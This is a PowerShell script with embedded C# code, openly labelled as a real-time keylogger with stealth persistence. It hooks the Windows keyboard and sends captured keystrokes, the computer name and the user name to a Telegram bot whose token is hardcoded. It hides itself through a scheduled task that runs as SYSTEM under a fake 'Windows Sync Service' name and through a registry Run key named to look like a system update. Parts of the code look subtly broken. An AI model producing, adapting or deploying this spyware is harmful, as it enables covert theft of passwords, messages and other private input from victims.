# Real-time Keylogger + Stealth Persistence
# Creates a low-level keyboard hook, sends keys to Telegram, persists via scheduled task

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$logFile = "$env:TEMP\kl.txt"

# Send message to Telegram
function Send-Message {
    param([string]$Text)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatId;text=$Text;parse_mode="HTML"} -ErrorAction Stop | Out-Null
    } catch {
        try { $body="chat_id=$chatId&text=$([Uri]::EscapeDataString($Text))"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("Content-Type","application/x-www-form-urlencoded"); $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage",$body) | Out-Null } catch {}
    }
}

# === LOW-LEVEL KEYBOARD HOOK ===
$hookCode = @'
using System;using System.Runtime.InteropServices;using System.Text;using System.Windows.Forms;
public class KL{public const int WH_KEYBOARD_LL=13;public const int WM_KEYDOWN=0x0100;
[DllImport("user32.dll")]public static extern IntPtr SetWindowsHookEx(int idHook,LowLevelKeyboardProc lpfn,IntPtr hMod,uint dwThreadId);
[DllImport("user32.dll")]public static extern bool UnhookWindowsHookEx(IntPtr hhk);
[DllImport("user32.dll")]public static extern IntPtr CallNextHookEx(IntPtr hhk,int nCode,IntPtr wParam,IntPtr lParam);
[DllImport("kernel32.dll")]public static extern IntPtr GetModuleHandle(string lpModuleName);
public delegate IntPtr LowLevelKeyboardProc(int nCode,IntPtr wParam,IntPtr lParam);
public static void Start(){using(var hook=new KH()){hook.Run();System.Threading.Thread.Sleep(Timeout.Infinite);}}
}
public class KH{private IntPtr _hookID=IntPtr.Zero;private KL.LowLevelKeyboardProc _proc;private StringBuilder _buf=new StringBuilder();private int _cnt=0;
public KH(){_proc=HookCallback;}public void Run(){using(var cur=Process.GetCurrentProcess())using(var mod=cur.MainModule){_hookID=KL.SetWindowsHookEx(KL.WH_KEYBOARD_LL,_proc,KL.GetModuleHandle(mod.ModuleName),0);}Application.Run();KL.UnhookWindowsHookEx(_hookID);}
private IntPtr HookCallback(int nCode,IntPtr wParam,IntPtr lParam){if(nCode>=0){int vk=Marshal.ReadInt32(lParam);bool kd=(wParam==(IntPtr)KL.WM_KEYDOWN);if(kd){string key=GK(vk);if(!string.IsNullOrEmpty(key)){_buf.Append(key);_cnt++;if(_cnt>=15){Flush();_buf.Clear();_cnt=0;}}}return KL.CallNextHookEx(IntPtr.Zero,nCode,wParam,lParam);}}
private string GK(int vk){switch(vk){case 0x08:return"[BACKSPACE]";case 0x09:return"[TAB]";case 0x0D:return"[ENTER]";case 0x10:return GetKeyState(0x10)?"[SHIFT]":"";case 0x11:return GetKeyState(0x11)?"[CTRL]":"";case 0x12:return"[ALT]";case 0x1B:return"[ESC]";case 0x20:return"[SPACE]";case 0x2E:return"[DEL]";case 0x2C:return"[PRINTSCR]";case 0x30:case 0x31:case 0x32:case 0x33:case 0x34:case 0x35:case 0x36:case 0x37:case 0x38:case 0x39:return GetKeyState(0x10)?((char)('0'+(vk-0x30))).ToString().ToUpper():((char)('0'+(vk-0x30))).ToString();case 0x41:case 0x42:case 0x43:case 0x44:case 0x45:case 0x46:case 0x47:case 0x48:case 0x49:case 0x4A:case 0x4B:case 0x4C:case 0x4D:case 0x4E:case 0x4F:case 0x50:case 0x51:case 0x52:case 0x53:case 0x54:case 0x55:case 0x56:case 0x57:case 0x58:case 0x59:case 0x5A:return GetKeyState(0x10)?((char)vk).ToString().ToUpper():((char)vk).ToString().ToLower();case 0x60:case 0x61:case 0x62:case 0x63:case 0x64:case 0x65:case 0x66:case 0x67:case 0x68:case 0x69:return"[NUM"+(vk-0x60)+"]";}return null;}
private bool GetKeyState(int key){return(GetAsyncKeyState(key)&0x8000)!=0;}
[DllImport("user32.dll")]private static extern short GetAsyncKeyState(int vKey);
private void Flush(){if(_buf.Length==0)return;try{System.IO.File.AppendAllText("$ENV_TMP_KL",_buf.ToString()+Environment.NewLine);var wc=new System.Net.WebClient();wc.Headers.Add("Content-Type","text/plain");try{wc.UploadString("https://api.telegram.org/bot$BOT_TOKEN/sendMessage","POST","chat_id=$CHAT_ID&text=KEYLOG:"+System.Uri.EscapeDataString(_buf.ToString()));}catch{}_buf.Clear();_cnt=0;}catch{}}}
'@

# Replace placeholders
$hookCode = $hookCode.Replace('$ENV_TMP_KL', "$env:TEMP\kl.txt").Replace('$BOT_TOKEN', $botToken).Replace('$CHAT_ID', $chatId)
Add-Type -TypeDefinition $hookCode -Name KL -Namespace HID -ErrorAction SilentlyContinue

# Start keylogger
try { [HID.KL]::Start() } catch { Send-Message "[KEYLOGGER] Error starting: $_" }
Send-Message "[KEYLOGGER] Active on $env:COMPUTERNAME | User: $env:USERNAME"

# === PERSISTENCE: Scheduled Task (runs hidden at every logon) ===
$klPath = "$env:TEMP\kl.ps1"
$hookCode | Out-File $klPath -Encoding UTF8

$taskName = "WinSync_" + (Get-Random -Minimum 1000 -Maximum 9999)
try {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$klPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Windows Sync Service" -Force -ErrorAction SilentlyContinue
    Send-Message "[PERSISTENCE] Scheduled task '$taskName' created"
} catch { Send-Message "[PERSISTENCE] Error: $_" }

# Also registry persistence
try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SysUpdate32" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$klPath`"" -Force } catch {}

# Keep running forever
Send-Message "[KEYLOGGER] Running silently. Close this window anytime - it keeps working via scheduled task."
while ($true) { Start-Sleep -Seconds 3600 }
